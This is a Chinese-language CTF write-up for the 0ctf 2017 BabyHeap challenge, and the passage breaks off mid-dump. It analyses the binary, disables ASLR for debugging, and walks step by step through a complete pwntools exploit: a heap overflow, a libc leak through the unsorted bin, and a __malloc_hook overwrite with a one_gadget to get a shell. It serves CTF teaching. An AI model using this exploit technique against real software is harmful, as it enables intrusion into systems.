[{"title":"0ctf_2017_BabyHeap","url":"/2023/09/13/0ctf_2017_BabyHeap/","content":"fastbin_attack中的Arbitrary Alloc（例题）具体例子原理网上很多，这里就不再赘述了，这里讲解一道fastbin_attack中的Arbitrary Alloc\n\n题目来源：0ctf 2017 BabyHeap参考资料：https://blog.csdn.net/qq_36495104/article/details/106202135 #思路CTF-wikihttps://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ #payloadhttps://blog.csdn.net/counsellor/article/details/81543197 #关闭地址随机化\n\n\n附件：链接: https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw  密码: f1i6–来自百度网盘超级会员V3的分享\n\n\n准备工作将文件下载下来，首先检查一下文件的保护情况：\n\n可以看到保护全部开启（这还玩个毛线啊）具体看一下各个保护：\n\nArch:   amd64-64-little这个说明程序是64位程序，小端序   RELRO:   Full RELROFull RELRO开启，使整个 GOT 只读，从而无法被覆盖，进一步来说GOT表无法被修改   Stack:   Canary found对使用随机数每个函数进行保护，防止栈溢出   NX:    NX enabled不能向栈上直接注入shellcode   PIE:    PIE enabled地址随机化，我感觉这个保护是最恶心的来看一下我的Linux环境：Ubuntu版本：16.04\n\n其中libc-2.23.so是我本机的libc文件\n静态分析整个程序相当于一个堆内存管理器，静态分析一下吧：\nmain 函数__int64 __fastcall main(__int64 a1, char **a2, char **a3){  char *addr; // [rsp+8h] [rbp-8h]  addr = get_addr();  while ( 1 )  {    menu();                                     //                                                 //   puts(\"1. Allocate\");                                                //   puts(\"2. Fill\");                                                //   puts(\"3. Free\");                                                //   puts(\"4. Dump\");                                                //   puts(\"5. Exit\");                                                //   printf(\"Command: \");                                                //     input();    switch ( (unsigned __int64)off_14F4 )    {      case 1uLL:        Allocate((__int64)addr);        break;      case 2uLL:        Fill((__int64)addr);        break;      case 3uLL:        Free((__int64)addr);        break;      case 4uLL:        Dump((__int64)addr);        break;      case 5uLL:        return 0LL;      default:        continue;    }  }}\n\n主函数内容，包含菜单函数和四个堆功能函数\nget_addr 函数(生成随机地址)char *get_addr(){  int fd; // [rsp+4h] [rbp-3Ch]  char *addr; // [rsp+8h] [rbp-38h]  unsigned __int64 v3; // [rsp+10h] [rbp-30h]  __int64 buf[4]; // [rsp+20h] [rbp-20h] BYREF  buf[3] = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  alarm(60u);  puts(\"===== Baby Heap in 2017 =====\");  fd = open(\"/dev/urandom\", 0);                 // 调用系统文件生成随机数  if ( fd &lt; 0 || read(fd, buf, 0x10uLL) != 16 )    exit(-1);  close(fd);  addr = (char *)((buf[0] % 0x555555543000uLL + 0x10000) &amp; 0xFFFFFFFFFFFFF000LL);  v3 = (buf[1] % 0xE80uLL) &amp; 0xFFFFFFFFFFFFFFF0LL;  if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr )    exit(-1);  return &amp;addr[v3];                             // 利用生成的随机数来生成随机地址}\n\n​\t\t这个函数可以使程序堆块信息存放在随机地址中，而不是固定的地址，因此我们很难通过找到存放堆块信息的地址来修改其地址从而控制程序的流程。​\t\t还需要提一句的是，这个函数有alarm函数，从程序运行60秒之后就会终止进程，如果不想在调试程序的时候被打断，可以对二进制文件进行patch。patch之后的可执行文件名为：babyheap_0ctf_2017_patch\n返回的addr 指针 包含了 所有chunk 的 信息和 数据chunk 的指针\nmeau 函数void __cdecl menu(){  puts(\"1. Allocate\");  puts(\"2. Fill\");  puts(\"3. Free\");  puts(\"4. Dump\");  puts(\"5. Exit\");  printf(\"Command: \");}\n\n打印菜单\nAlloc 函数void __fastcall Allocate(__int64 a1){  int i; // [rsp+10h] [rbp-10h]  int size; // [rsp+14h] [rbp-Ch]  void *calloc_ptr; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  {    if ( !*(_DWORD *)(24LL * i + a1) )    {      printf(\"Size: \");      size = input();      if ( size &gt; 0 )      {        if ( size &gt; 4096 )          size = 4096;        calloc_ptr = calloc(size, 1uLL);        if ( !calloc_ptr )          exit(-1);        *(_DWORD *)(24LL * i + a1) = 1;\t\t\t\t\t\t\t//chunk_flag        *(_QWORD *)(a1 + 24LL * i + 8) = size;\t\t\t\t\t//chunk_size        *(_QWORD *)(a1 + 24LL * i + 16) = calloc_ptr;\t\t\t//chunk_data_ptr 指向calloc出来的chunk_data        printf(\"Allocate Index %d\\n\", (unsigned int)i);      }      return;    }  }}\n\n传入的参数地址是get_addr 随机生成的地址。allocate函数是来创建堆块的，申请chunk最大的大小为4096。\n首先输入堆块的content_size，然后调用calloc函数根据输入的content_size大小来创建堆块，最后堆块的信息保存在get_addr指针所指向的地址中。需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为\\x00。请注意，堆块的index是从0开始的因此程序的结构体为：\n\n●chunk_flag:用来判断堆块是否存在●chunk_content_size:#记录content的大小●chunk_data_ptr:指向calloc出来的chunk_data\n\nFill 函数void __fastcall Fill(__int64 a1){  signed int v1; // [rsp+18h] [rbp-8h]  int v2; // [rsp+1Ch] [rbp-4h]  printf(\"Index: \");  v1 = input();  if ( (unsigned int)v1 &lt;= 0xF &amp;&amp; *(_DWORD *)(24LL * v1 + a1) == 1 )\t//判断序号是否正确，判断flag为 chunk 是否存在  {    printf(\"Size: \");    v2 = input();\t\t\t\t\t//又让输出size，改写 chunk 数据部分的内容,存在溢出!!    if ( v2 &gt; 0 )    {      printf(\"Content: \");      read_func2(*(_QWORD *)(24LL * v1 + a1 + 16), v2); \t//*(_QWORD *)(24LL * v1 + a1 + 16) == chunk_data    }  }}\n\n上图是Fill函数分伪代码，这个函数的功能比较有意思，漏洞也是存在这个函数中的。在填充内容的功能中，调用input函数来输入堆块的大小，并没有设置字符串结尾。而且比较有意思的是，这次又让我们重新输入了content_size，但是程序并没有将原来结构体中的content_size更改。且执行这个函数之后allocate chunk时堆块的size域没有改变，所以这里就出现了任意堆溢出的情形。\nFree 函数void __fastcall Free(__int64 a1){  signed int v1; // [rsp+1Ch] [rbp-4h]  printf(\"Index: \");  v1 = input();  if ( (unsigned int)v1 &lt;= 0xF &amp;&amp; *(_DWORD *)(24LL * v1 + a1) == 1 )  {    *(_DWORD *)(24LL * v1 + a1) = 0;    *(_QWORD *)(24LL * v1 + a1 + 8) = 0LL;    free(*(void **)(24LL * v1 + a1 + 16));    *(_QWORD *)(24LL * v1 + a1 + 16) = 0LL;     // 指针置空  }}\n\n输入序号，释放chunk。将 flag 字段，size 字段清0，free了数据chunk的指针同时也清0，不存在uaf\nDump 函数void __fastcall Dump(__int64 a1){  signed int v1; // [rsp+1Ch] [rbp-4h]  printf(\"Index: \");  v1 = input();  if ( (unsigned int)v1 &lt;= 0xF &amp;&amp; *(_DWORD *)(24LL * v1 + a1) == 1 )  {    puts(\"Content: \");    write_func(*(_QWORD *)(24LL * v1 + a1 + 16), *(_QWORD *)(24LL * v1 + a1 + 8));    puts(byte_14F1);  }}\n\n输入序号，打印内容\ngdb 动态调试还记得之前get_addr这个函数吗？这个函数主要使用来生成随机地址，其中指针也存放在哪里。\n关闭ASLR保护由于这个程序开启了PIE保护，为了方便调试程序及查看堆内存，因此我们将Linux的ALSR(地址空间随机化)进行关闭。首先看一下ALSR开启的状态，可以使用下面的任意其中一种命令\nubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space2ubuntu@ubuntu:~$ sysctl -a --pattern randomizekernel.randomize_va_space = 2ubuntu@ubuntu:~$###0 = 关闭1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（PIE也会影响heap的随机化）2 = 全随机。除了1中所述，还有heap。###\n\n现在关闭ASLR，关闭方法如下：方法一： 手动修改randomize_va_space文件上面介绍的randomize_va_space文件的枚举值含义，设置的值不同，linux内核加载程序的地址空间的策略就会不同。比较简单明了。这里0代表关闭ASLR。\necho 0 &gt; /proc/sys/kernel/randomize_va_space#注意，这里是先进root权限，后执行。#重启之后会恢复默认\n\n方法二： 使用sysctl控制ASLR\nsysctl -w kernel.randomize_va_space=0#重启之后将恢复默认#如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。\n\n方法三： 使用setarch控制单个程序的随机化如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。\nsetarch `uname -m` -R ./your_program#-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)\n\n方法四： 在GDB场景下，使用set disable-randomization off在调试特定程序时，可以通过set disable-randomization命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。当然，这里开启，关闭和查看的方法看起来就比较正规了。\n关闭ASLR：set disable-randomization on开启ASLR：set disable-randomization off查看ASLR状态：show disable-randomization\n\n我们如何找到那个随机地址呢？通过多次对程序gdb调试，发现了一直变化的地址（此时的ASLR已关闭，参见下文章下面的内容），下面的代码框之中是两次gdb调试的内存分布：\n\n\n通过对比发现，变动的只有第一行的地址：\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x40729d6e2000     0x40729d6e3000 rw-p     1000 0 \n​    0x2dd727226000     0x2dd727227000 rw-p     1000 0 \n到这里，可以猜测一下，程序的指针应该也存放在这片内存区域中。我们重新gdb调试，通过执行函数Allocate和fill，来看一下这片内存：\ngiantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017$ gdb babyheap_0ctf_2017GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from babyheap_0ctf_2017...(no debugging symbols found)...done.pwndbg&gt; rStarting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017 ===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand: 1Size: 20Allocate Index 01. Allocate2. Fill3. Free4. Dump5. ExitCommand: 2Index: 0Size: 40Content: aaaaaaaaaaaaaaaaaa^CProgram received signal SIGINT, Interrupt.0x00007ffff7b04360 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:8484\t../sysdeps/unix/syscall-template.S: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────── RAX  0xfffffffffffffe00 RBX  0x0 RCX  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff RDX  0x15 RDI  0x0 RSI  0x555555757023 ◂— 0x20fe10000000000 R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700 R9   0x9 R10  0x0 R11  0x246 R12  0x555555554a40 ◂— xor    ebp, ebp R13  0x7fffffffdd50 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffdc20 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc70 —▸ 0x5555555553e0 ◂— push   r15 RSP  0x7fffffffdbf8 —▸ 0x5555555551fd ◂— mov    qword ptr [rbp - 8], rax RIP  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────── ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;    ↓   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff   0x7ffff7b043a9 &lt;read+89&gt;               ret        0x7ffff7b043aa                         nop    word ptr [rax + rax]   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;    ↓   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────00:0000│ rsp  0x7fffffffdbf8 —▸ 0x5555555551fd ◂— mov    qword ptr [rbp - 8], rax01:0008│      0x7fffffffdc00 ◂— 0x28 /* '(' */02:0010│      0x7fffffffdc08 —▸ 0x555555757010 ◂— 0x6161616161616161 ('aaaaaaaa')03:0018│      0x7fffffffdc10 ◂— 0x13... ↓05:0028│ rbp  0x7fffffffdc20 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc70 —▸ 0x5555555553e0 ◂— push   r1506:0030│      0x7fffffffdc28 —▸ 0x555555554f48 ◂— jmp    0x555555554f4e07:0038│      0x7fffffffdc30 ◂— 0x0───────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────── ► f 0     7ffff7b04360 __read_nocancel+7   f 1     5555555551fd   f 2     555555554f48   f 3     555555555188   f 4     7ffff7a2d840 __libc_start_main+240Program received signal SIGINTpwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x3b0326206000     0x3b0326207000 rw-p     1000 0          0x555555554000     0x555555556000 r-xp     2000 0      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017    0x555555755000     0x555555756000 r--p     1000 1000   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017    0x555555756000     0x555555757000 rw-p     1000 2000   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017    0x555555757000     0x555555778000 rw-p    21000 0      [heap]    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0          0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7fdc000     0x7ffff7fdf000 rw-p     3000 0          0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0          0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]pwndbg&gt; \n\n再看一下 0x3b0326206000 这片内存区域，确定是程序结构体中指针存放的位置，标注一下：\n这里我重新调试了一个gdb\n0xb422b6be0c0:\t0x0000000000000000\t0x00000000000000000xb422b6be0d0:\t0x0000000000000001\t0x0000000000000014    \t\t\t#chunk_flag\t\t\t#size0xb422b6be0e0:\t0x0000555555757010\t0x0000000000000000    \t\t\t#chunk_data_ptr0xb422b6be0f0:\t0x0000000000000000\t0x00000000000000000xb422b6be100:\t0x0000000000000000\t0x00000000000000000xb422b6be110:\t0x0000000000000000\t0x00000000000000000xb422b6be120:\t0x0000000000000000\t0x00000000000000000xb422b6be130:\t0x0000000000000000\t0x0000000000000000\n\nexp 讲解exp的主要内容如下：\n\nexp来自@yichen师傅：https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ\n\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./babyheap_0ctf_2017_patch')elf = ELF('./babyheap_0ctf_2017_patch')#首先是定义的一些函数，对应着程序的功能def alloc(size):    p.recvuntil(\"Command: \")    p.sendline(\"1\")    p.recvuntil(\"Size: \")    p.sendline(str(size))def fill(idx, content):    p.recvuntil(\"Command: \")    p.sendline(\"2\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))    p.recvuntil(\"Size: \")    p.sendline(str(len(content)))    p.recvuntil(\"Content: \")    p.send(content)def free(idx):    p.recvuntil(\"Command: \")    p.sendline(\"3\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))def dump(idx):    p.recvuntil(\"Command: \")    p.sendline(\"4\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))    p.recvline()    return p.recvline()def unsorted_offset_arena(idx):    word_bytes = context.word_size / 8    offset = 4  # lock    offset += 4  # flags    offset += word_bytes * 10  # offset fastbin    offset += word_bytes * 2  # top,last_remainder    offset += idx * 2 * word_bytes  # idx    offset -= word_bytes * 2  # bin overlap    return offset#首先申请4个fast chunk和1个small chunkalloc(0x10)#index0alloc(0x10)#index1alloc(0x10)#index2alloc(0x10)#index3alloc(0x80)#index4#free两个,这时候会放到fastbins中,而且因为是后进的,所以#fastbin[0]-&gt;index2-&gt;index1-&gt;NULLfree(1)free(2)#这个时候我们去对index0进行fill操作,他就会把index2的指针的末位改成0x80,也就指向了index4#解释一下,前面申请了4块0x10的,加上chunk的一些信息,合起来是0x80#所以把那个末位改成0x80就指向了index4,这样chunk4就被放到了fastbins中payload = p64(0)*3payload += p64(0x21)payload += p64(0)*3payload += p64(0x21)payload += p8(0x80)fill(0, payload)#然后再通过index3去进行写入,把index4的大小改成0x21#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fast chunk的范围内payload = p64(0)*3payload += p64(0x21)fill(3, payload)#改好index4的大小之后去申请两次，这样就把原来的fastbins中的给申请出来了alloc(0x10)alloc(0x10)#申请成功之后index2就指向index4#为了让index4能够被放到unsortedbins中,要把它的大小改回来payload = p64(0)*3payload += p64(0x91)fill(3, payload)#再申请一个防止index4与top chunk合并了alloc(0x80)#这时候free就会把index4放到unsorted中了free(4)#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了#main_arena与libc偏移为0x3c4b20(文末有工具算)#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移unsorted_offset_mainarena=unsorted_offset_arena(5)#这函数还不太明白unsorted_addr=u64(dump(2)[:8].strip().ljust(8, \"\\x00\"))libc_base=unsorted_addr-0x3c4b20-unsorted_offset_mainarenalog.info(\"libc_base: \"+hex(libc_base))#此时因为fastbins中没有了,所以从unsortedbins中找alloc(0x60)#index2还是指向index4那个地方我们可以先释放index4free(4)#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小#这个地址是main_arena-0x40+0xd,具体看后面图片解释payload = p64(libc_base+0x3c4aed)fill(2, payload)#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处alloc(0x60)#index4alloc(0x60)#index6#然后往malloc_hook上写one_gadget的地址payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4527a)fill(6, payload)#再申请一下触发one_gadgetalloc(255)p.interactive()\n\n漏洞利用思路从上面的内容可以看出，主要的漏洞是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下：\n\n利用 unsorted bin 地址泄漏 libc 基地址。（用unsortedbin的原因之后再说）\n利用 fastbin attack中的Arbitrary Alloc技术将chunk 分配到 malloc_hook 附近。\n\n1. leak libc_addr1-1 模仿程序功能def alloc(size):    p.recvuntil(\"Command: \")    p.sendline(\"1\")    p.recvuntil(\"Size: \")    p.sendline(str(size))def fill(idx, content):    p.recvuntil(\"Command: \")    p.sendline(\"2\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))    p.recvuntil(\"Size: \")    p.sendline(str(len(content)))    p.recvuntil(\"Content: \")    p.send(content)def free(idx):    p.recvuntil(\"Command: \")    p.sendline(\"3\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))def dump(idx):    p.recvuntil(\"Command: \")    p.sendline(\"4\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))    p.recvline()    return p.recvline()\n\n这4个函数分别对应程序的四个主要功能，这里就不多说了。\n1-2 申请 5个chunk由于我们希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能被回收到 fastbin chunk，也不能和 top chunk 相邻。因为后者在不是fastbin 的情况下，会被合并到 top chunk 中。具体设计如下：\nalloc(0x10)#index0alloc(0x10)#index1alloc(0x10)#index2alloc(0x10)#index3alloc(0x80)#index4\n\n执行完此payload之后的heap情况如下：\npwndbg&gt; x/50gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index4......（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk\n\n此时程序结构体中的情况：\n0x5fcead98720:\t0x0000000000000000\t0x00000000000000000x5fcead98730:\t0x0000000000000001\t0x0000000000000010    \t\t\t#index00x5fcead98740:\t0x0000555555757010\t0x0000000000000001    \t\t\t\t\t\t\t\t#index10x5fcead98750:\t0x0000000000000010\t0x00005555557570300x5fcead98760:\t0x0000000000000001\t0x0000000000000010     \t\t\t#index20x5fcead98770:\t0x0000555555757050\t0x0000000000000001    \t\t\t\t\t\t\t\t#index30x5fcead98780:\t0x0000000000000010\t0x00005555557570700x5fcead98790:\t0x0000000000000001\t0x0000000000000080    \t\t\t#index40x5fcead987a0:\t0x0000555555757090\t0x00000000000000000x5fcead987b0:\t0x0000000000000000\t0x0000000000000000\n\n1-3 free创建的index1和index2#free两个,这时候会放到fastbins中,而且因为是后进的,所以#fastbin[0]-&gt;index2-&gt;index1-&gt;NULLfree(1)free(2)\n\n执行此部分payload，来看一下堆状况：\npwndbg&gt; x/50gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000555555757020\t0x0000000000000000    \t\t\t#fd指针指向index1的起始地址0x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index40x555555757090:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk.....（省略内容均为空）pwndbg&gt;\n\n此时的bin和main_arena情况：\npwndbg&gt; binfastbins0x20: 0x0000555555757020-&gt;0x555555757040 ◂— 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000000000000\t0x0000555555757040 #index20x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000555555757110 #top_chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x00007ffff7dd1b780x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b88pwndbg&gt;\n\n程序的结构体状况如下：\n0x5fcead98730:\t0x0000000000000001\t0x0000000000000010    \t\t\t#index00x5fcead98740:\t0x0000555555757010\t0x0000000000000000    \t\t\t\t\t\t\t\t#index1（chunk_flag置零）0x5fcead98750:\t0x0000000000000000\t0x0000000000000000                #chunk_content_size置零   #chunk_data_ptr置空     0x5fcead98760:\t0x0000000000000000\t0x0000000000000000     \t\t\t#index2（chunk_flag置零）  #chunk_data_size置零     0x5fcead98770:\t0x0000000000000000\t0x0000000000000001    \t\t\t#chunk_data_ptr置空  #index30x5fcead98780:\t0x0000000000000010\t0x00005555557570700x5fcead98790:\t0x0000000000000001\t0x0000000000000080    \t\t\t#index40x5fcead987a0:\t0x0000555555757090\t0x00000000000000000x5fcead987b0:\t0x0000000000000000\t0x0000000000000000\n\n1-4 对 index0 进行 fill 操作，溢出修改 index2 和 fd 指针payload = p64(0)*3payload += p64(0x21)payload += p64(0)*3payload += p64(0x21)payload += p8(0x80)fill(0, payload)\n\n还记得上面提到的程序漏洞吗？第一次执行Allocate函数时chunk_content_size是我们指定的，但是fill的时候并没有将新的chunk_content_size写入到结构体中，并且之前alloc chunk时指定的堆块size大小没有发生改变，所以这里就出现了任意堆溢出的情形。这一小段payload的目的是：通过fill index0溢出修改index2的fd指针为index4的地址，此处的payload只用修改fd的最后一个字节为0x80即可。执行payload之后的内存空间如下：\n\nchunk2-&gt;fd已成功修改为chunk4的起始地址（这个起始地址是指向chunk header的）\n\npwndbg&gt; x/50gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x0000000000000000                #payload从这里开始修改堆块内容0x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index2（fastbin）0x555555757050:\t0x0000555555757080\t0x0000000000000000    \t\t\t#此处的fd指针已经被修改--------------------------------------------------------------    执行payload前原来的内容为：0x555555757050:\t0x0000555555757020\t0x0000000000000000--------------------------------------------------------------    0x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index4（fastbin）0x555555757090:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk.....（省略内容均为空）pwndbg&gt;  \n\n1-5 对 index3 进行fill操作，将 index4 的大小修改为 0x21#然后再通过index3去进行写入,把index4的大小改成0x21#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fastbin的范围内（请注意这点)payload = p64(0)*3payload += p64(0x21)fill(3, payload)\n\n0x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index2（fastbin）0x555555757050:\t0x0000555555757080\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000021 #index4（fastbin）--------------------------------------------------------------    执行payload前原来的内容为：0x555555757080:\t0x0000000000000000\t0x0000000000000091 #index4（fastbin）-------------------------------------------------------------- .....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk.....（省略内容均为空）0x555555757180:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n再次强调，在申请fastbin中内存时，会检查被释放堆块的size（大小）是否在fastbin的范围内，如果不在，程序则异常退出，这有关于fastbin的机制。结构体状况未发生改变。\n1-6 申请 index4#改好index4的大小之后去申请两次，这样就把原来的fastbin中的给申请出来了alloc(0x10)alloc(0x10)#申请成功之后index2就指向index4\n\n首先是两个malloc，前面fastbin里一开始是两个chunk，分别为index2-&gt;index1，后来我们修改index2-&gt;fd为index4的地址，fastbin里变为\nindex2-&gt;index4。第一个malloc会先分配index2给我们（fastbin分配原则是LIFO即后进先出），第二个malloc会将index4分配给我们。看一下堆：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x555555757000Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757020Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757040Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757060Size: 0x21Allocated chunkAddr: 0x555555757080Size: 0x00pwndbg&gt; \n\n此时的内存：\npwndbg&gt; x/50gx 